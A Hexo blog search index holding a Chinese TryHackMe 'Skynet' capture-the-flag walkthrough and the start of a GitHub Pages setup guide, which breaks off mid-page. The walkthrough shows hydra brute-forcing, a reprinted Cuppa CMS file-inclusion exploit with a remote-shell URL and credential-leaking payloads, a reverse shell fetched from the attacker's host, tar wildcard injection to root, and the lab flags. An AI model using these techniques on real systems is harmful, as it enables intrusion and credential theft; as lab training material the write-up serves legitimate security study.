<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>TryHackMe-Skynet</title>
    <link href="/2023/07/22/TryHackMe-Skynet/"/>
    <url>/2023/07/22/TryHackMe-Skynet/</url>
    
    <content type="html"><![CDATA[<blockquote><p>What is Miles password for his emails?</p></blockquote><p>nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>110/tcp open  pop3<br>139/tcp open  netbios-ssn<br>143/tcp open  imap<br>445/tcp open  microsoft-ds<br><br>PORT    STATE SERVICE     VERSION<br>80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Skynet<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>110/tcp open  pop3        Dovecot pop3d<br>|_pop3-capabilities: TOP CAPA UIDL RESP-CODES SASL AUTH-RESP-CODE PIPELINING<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>143/tcp open  imap        Dovecot imapd<br>|_imap-capabilities: post-login LITERAL+ LOGIN-REFERRALS more IMAP4rev1 capabilities have listed Pre-login IDLE LOGINDISABLEDA0001 SASL-IR ENABLE OK ID<br>445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br><br>Host script results:<br>|_clock-skew: mean: 1h40m06s, deviation: 2h53m24s, median: 0s<br>|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-07-22T12:26:22<br>|_  start_date: N/A<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: skynet<br>|   NetBIOS computer name: SKYNET\x00<br>|   Domain name: \x00<br>|   FQDN: skynet<br>|_  System time: 2023-07-22T07:26:22-05:00<br></code></pre></td></tr></table></figure><p>目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─<span class="hljs-comment"># gobuster dir -u http://10.10.5.188/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</span><br>/admin                (Status: 301) [Size: 310] [--&gt; http://10.10.5.188/admin/]<br>/config               (Status: 301) [Size: 311] [--&gt; http://10.10.5.188/config/]<br>/css                  (Status: 301) [Size: 308] [--&gt; http://10.10.5.188/css/]<br>/index.html           (Status: 200) [Size: 523]<br>/js                   (Status: 301) [Size: 307] [--&gt; http://10.10.5.188/js/]<br>/server-status        (Status: 403) [Size: 276]<br>/squirrelmail         (Status: 301) [Size: 317] [--&gt; http://10.10.5.188/squirrelmail/]<br></code></pre></td></tr></table></figure><p>爆破smb服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─<span class="hljs-comment"># enum4linux -a 10.10.5.188</span><br><br>[+] Attempting to map shares on 10.10.5.188<br>//10.10.5.188/print$    Mapping: DENIED Listing: N/A Writing: N/A<br>//10.10.5.188/anonymous Mapping: OK Listing: OK Writing: N/A<br>//10.10.5.188/milesdyson        Mapping: DENIED Listing: N/A Writing: N/A<br>[E] Can<span class="hljs-string">&#x27;t understand response:</span><br><span class="hljs-string">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="hljs-string">//10.10.5.188/IPC$      Mapping: N/A Listing: N/A Writing: N/A</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 有个匿名登录</span><br><span class="hljs-string">┌──(root㉿kali)-[/home/kali]</span><br><span class="hljs-string">└─# smbclient //10.10.5.188/anonymous</span><br><span class="hljs-string">Password for [WORKGROUP\kali]:</span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Fri Nov 27 00:04:00 2020</span><br><span class="hljs-string">  ..                                  D        0  Tue Sep 17 15:20:17 2019</span><br><span class="hljs-string">  attention.txt                       N      163  Wed Sep 18 11:04:59 2019</span><br><span class="hljs-string">  logs                                D        0  Wed Sep 18 12:42:16 2019</span><br><span class="hljs-string"></span><br><span class="hljs-string">                9204224 blocks of size 1024. 5831064 blocks available</span><br><span class="hljs-string">smb: \&gt; get attention.txt</span><br><span class="hljs-string">getting file \attention.txt of size 163 as attention.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span><br><span class="hljs-string">smb: \&gt; cd logs</span><br><span class="hljs-string">smb: \logs\&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Wed Sep 18 12:42:16 2019</span><br><span class="hljs-string">  ..                                  D        0  Fri Nov 27 00:04:00 2020</span><br><span class="hljs-string">  log2.txt                            N        0  Wed Sep 18 12:42:13 2019</span><br><span class="hljs-string">  log1.txt                            N      471  Wed Sep 18 12:41:59 2019</span><br><span class="hljs-string">  log3.txt                            N        0  Wed Sep 18 12:42:16 2019</span><br></code></pre></td></tr></table></figure><p>attention.txt：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">A recent <span class="hljs-keyword">system</span> malfunction has caused various passwords <span class="hljs-keyword">to</span> be changed. <span class="hljs-keyword">All</span> skynet employees are required <span class="hljs-keyword">to</span> change their <span class="hljs-keyword">password</span> <span class="hljs-keyword">after</span> seeing this.<br>-Miles Dyson<br></code></pre></td></tr></table></figure><p>log1.txt：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cyborg007haloterminator<br>terminator22596<br>terminator219<br>terminator20<br>terminator1989<br>terminator1988<br>terminator168<br>terminator16<br>terminator143<br>terminator13<br>terminator123!@#<br>terminator1056<br>terminator101<br>terminator10<br>terminator02<br>terminator00<br>roboterminator<br>pongterminator<br>manasturcaluterminator<br><span class="hljs-keyword">exterminator95</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">exterminator200</span><br><span class="hljs-keyword"></span>dterminator<br>djxterminator<br>dexterminator<br>determinator<br>cyborg007haloterminator<br>avsterminator<br>alonsoterminator<br>Walterminator<br><span class="hljs-number">79</span>terminator6<br><span class="hljs-number">1996</span>terminator<br></code></pre></td></tr></table></figure><p>之前目录扫描有个邮件登录，smb爆破发现一个用户名milesdyson，使用hydra爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># hydra -l milesdyson -P /home/kali/log1.txt 10.10.5.188 http-form-post &quot;/squirrelmail/src/redirect.php:login_username=milesdyson&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:F=Unknown User or password incorrect.&quot;</span><br>[80][http-post-form] host: 10.10.5.188   login: milesdyson   password: cyborg007haloterminator<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/Untitled.png"></p><p>第一封邮件：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">We have changed your smb <span class="hljs-keyword">password</span> <span class="hljs-keyword">after</span> <span class="hljs-keyword">system</span> malfunction.<br><span class="hljs-keyword">Password</span>: )s&#123;A&amp;<span class="hljs-number">2</span>Z=F^n_E.B`<br></code></pre></td></tr></table></figure><p>登录smb：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># smbclient -U milesdyson //10.10.5.188/milesdyson</span><br>Improving Deep Neural Networks.pdf                            N  5743095  Tue Sep 17 17:05:14 2019<br>Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 17:05:14 2019<br>Convolutional Neural Networks-CNN.pdf                         N 19655446  Tue Sep 17 17:05:14 2019<br>notes                                                         D        0  Tue Sep 17 17:18:40 2019<br>Neural Networks and Deep Learning.pdf                         N  4304586  Tue Sep 17 17:05:14 2019<br>Structuring your Machine Learning Project.pdf                 N  3531427  Tue Sep 17 17:05:14 2019<br><br>smb: \&gt; <span class="hljs-built_in">cd</span> notes<br>smb: \notes\&gt; <span class="hljs-built_in">ls</span><br>important.txt                       N      117  Tue Sep 17 17:18:39 2019<br></code></pre></td></tr></table></figure><blockquote><p>What is the hidden directory?</p></blockquote><p>important.txt，发现了一个目录<code>/45kra24zxs28v3yd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. Add features to beta CMS /45kra24zxs28v3yd<br>2. Work on T-800 Model 101 blueprints<br>3. Spend more time with my wife<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/Untitled1.png"></p><p>对二级目录进行目录扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://10.10.5.188/45kra24zxs28v3yd -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt<br>/administrator        (Status: 301) [Size: 335] [--&gt; http://10.10.5.188/45kra24zxs28v3yd/administrator/]<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/Untitled2.png"></p><blockquote><p>What is the vulnerability called when you can include a remote file for malicious purposes?</p></blockquote><p><img src="/img/blogimg/Untitled3.png"></p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># Exploit Title   : Cuppa CMS File Inclusion</span><br><span class="hljs-comment"># Date            : 4 June 2013</span><br><span class="hljs-comment"># Exploit Author  : CWH Underground</span><br><span class="hljs-comment"># Site            : www.2600.in.th</span><br><span class="hljs-comment"># Vendor Homepage : http://www.cuppacms.com/</span><br><span class="hljs-comment"># Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip</span><br><span class="hljs-comment"># Version         : Beta</span><br><span class="hljs-comment"># Tested on       : Window and Linux</span><br><br>  ,--^----------,--------,-----,-------^--,<br>  | |||||||||   `--------<span class="hljs-string">&#x27;     |          O .. CWH Underground Hacking Team ..</span><br><span class="hljs-string">  `+---------------------------^----------|</span><br><span class="hljs-string">    `\_,-------, _________________________|</span><br><span class="hljs-string">      / XXXXXX /`|     /</span><br><span class="hljs-string">     / XXXXXX /  `\   /</span><br><span class="hljs-string">    / XXXXXX /\______(</span><br><span class="hljs-string">   / XXXXXX /          </span><br><span class="hljs-string">  / XXXXXX /</span><br><span class="hljs-string"> (________(            </span><br><span class="hljs-string">  `------&#x27;</span><br><br><span class="hljs-comment">####################################</span><br>VULNERABILITY: PHP CODE INJECTION<br><span class="hljs-comment">####################################</span><br><br>/alerts/alertConfigField.<span class="hljs-title function_ invoke__">php</span> (<span class="hljs-attr">LINE</span>: <span class="hljs-number">22</span>)<br><br>-----------------------------------------------------------------------------<br>LINE <span class="hljs-number">22</span>: <br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;urlConfig&quot;</span>]); <span class="hljs-meta">?&gt;</span><br>-----------------------------------------------------------------------------<br>    <br><br><span class="hljs-comment">#####################################################</span><br>DESCRIPTION<br><span class="hljs-comment">#####################################################</span><br><br>An attacker might <span class="hljs-keyword">include</span> local <span class="hljs-keyword">or</span> remote PHP files <span class="hljs-keyword">or</span> read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.<br><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]</span><br><br><span class="hljs-comment">#####################################################</span><br>EXPLOIT<br><span class="hljs-comment">#####################################################</span><br><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</span><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br><br>Moreover, We could access Configuration.php source code via PHPStream <br><br>For Example:<br>-----------------------------------------------------------------------------<br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</span><br>-----------------------------------------------------------------------------<br><br>Base64 Encode Output:<br>-----------------------------------------------------------------------------<br>PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+<br>-----------------------------------------------------------------------------<br><br>Base64 Decode Output:<br>-----------------------------------------------------------------------------<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Configuration</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span> = <span class="hljs-string">&quot;cuppa&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;Db@dmin&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$table_prefix</span> = <span class="hljs-string">&quot;cu_&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$administrator_template</span> = <span class="hljs-string">&quot;default&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$list_limit</span> = <span class="hljs-number">25</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span> = <span class="hljs-string">&quot;OBqIPqlFWf3X&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$allowed_extensions</span> = <span class="hljs-string">&quot;*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_default_path</span> = <span class="hljs-string">&quot;media/uploadsFiles&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$maximum_file_size</span> = <span class="hljs-string">&quot;5242880&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$secure_login</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$secure_login_value</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$secure_login_redirect</span> = <span class="hljs-string">&quot;&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br>-----------------------------------------------------------------------------<br><br>Able to read sensitive information via File <span class="hljs-title function_ invoke__">Inclusion</span> (PHP Stream)<br><br><span class="hljs-comment">################################################################################################################</span><br> Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD <span class="hljs-variable">$ectors</span>, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 <br><span class="hljs-comment">################################################################################################################</span><br></code></pre></td></tr></table></figure><p>在本机放一个反弹shell的脚本，通过远程文件包含获取shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在浏览器执行</span><br>http://10.10.5.188/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://本机IP/phpshell.php<br></code></pre></td></tr></table></figure><blockquote><p>What is the user flag?</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> user.txt <br>7ce5c2109a40f958099283600a9ae807<br></code></pre></td></tr></table></figure><blockquote><p>What is the root flag?</p></blockquote><p>计划任务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/home/milesdyson/backups$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># m h dom mon dow user  command</span><br>*/1 *   * * *   root    /home/milesdyson/backups/backup.sh<br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><br><span class="hljs-comment"># backup.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /var/www/html<br>tar cf /home/milesdyson/backups/backup.tgz *<br></code></pre></td></tr></table></figure><blockquote><p>通过<code>tar</code>命令可以利用一个名为<code>–checkpoint</code>的参数，该参数允许在每次归档 X 个文件时（X的默认值为10）显示“进度”消息， <code>–checkpoint</code>还可以与 <code>–checkpoint-action</code> 标志串联使用，<code>–checkpoint-action</code>标志允许在到达检查点（checkpoint）时以二进制或脚本的形式执行某些操作。</p></blockquote><p>在<code>/var/www/html</code>目录下创建一个脚本来提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/var/www/html$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/sroot &amp;&amp; chmod +s /tmp/sroot&quot;</span> &gt; shell.sh<br></code></pre></td></tr></table></figure><p>再创建两个文件用来利用tar执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@skynet:/var/www/html$ <span class="hljs-built_in">touch</span> <span class="hljs-string">&quot;/var/www/html/--checkpoint=1&quot;</span><br>www-data@skynet:/var/www/html$ <span class="hljs-built_in">touch</span> <span class="hljs-string">&quot;/var/www/html/--checkpoint-action=exec=sh shell.sh&quot;</span><br>www-data@skynet:/tmp$ ./sroot -p<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br>sroot-4.3<span class="hljs-comment"># cat /root/root.txt</span><br>3f0372db24753accc7179a282cd6a949<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TryHackMe</tag>
      
      <tag>靶机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>github+hexo博客搭建记录</title>
    <link href="/2023/06/20/github-hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/06/20/github-hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><p>下载：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a> ，安装一路next就行，验证是否安装成功</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">node</span> <span class="hljs-title">-v</span><br></code></pre></td></tr></table></figure><h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><p>下载：<a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a> ，安装一路next，验证是否安装成功</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">git <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><h1 id="注册github及创建仓库"><a href="#注册github及创建仓库" class="headerlink" title="注册github及创建仓库"></a>注册github及创建仓库</h1><p>在<code>Repository name</code>填上之后用来访问的域名，格式为<code>xxx.github.io</code>，然后创建</p><p><img src="/img/blogimg/image-20230620134715015.png"></p><p>创建完后会有一个HTTP链接，在仓库首页也能找到，将这个链接复制下来备用</p><p><img src="/img/blogimg/image-20230620135019889.png"></p><h1 id="安装HEXO"><a href="#安装HEXO" class="headerlink" title="安装HEXO"></a>安装HEXO</h1><p>在本地新建一个空目录来存放博客相关的文件，进入这个目录，右键单击<code>Git Bash Here</code>，进入git的命令行(Windows的命令行可能会有问题，统一用git的)</p><p><img src="/img/blogimg/image-20230620135210032.png"></p><p>因为是从国外服务器下载，所以我们配置一下连接国内淘宝官方的服务器</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> install -g cnpm --registry=https://registry.<span class="hljs-built_in">npm</span>.taobao.org<br>之后再次使用命令则是以cnpm开头，而不是<span class="hljs-built_in">npm</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnpm install -g hexo-cli<br><span class="hljs-comment"># 初始化</span><br>hexo init<br><span class="hljs-comment"># 启动HEXO，可以在http://127.0.0.1:4000/看到一篇样例博客</span><br>hexo s<br><span class="hljs-comment"># 关闭HEXO</span><br>ctrl + c<br></code></pre></td></tr></table></figure><p><img src="/img/blogimg/image-20230620135654170.png"></p><h1 id="配置SSH免密登录"><a href="#配置SSH免密登录" class="headerlink" title="配置SSH免密登录"></a>配置SSH免密登录</h1><p>在<code>C:\Users\用户名</code>文件夹下右键打开<code>Git Bash Here</code>输入命令：<code>ssh-keygen -t rsa -C github邮件地址</code> ，输入后连敲三次回车生成.ssh秘钥。</p><p>之后会生成一个新的<code>C:\Users\用户名\.ssh</code>文件夹，打开这个文件夹，找到<code>.ssh\id_rsa.pub</code>文件，记事本打开并复制里面的内容。</p><p>打开github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key，把复制的内容粘贴进去，title随便填，保存即可，设置好的界面：</p><p><img src="/img/blogimg/image-20230620140108396.png"></p><p>检测是否设置成功(在git bash输入)：</p><figure 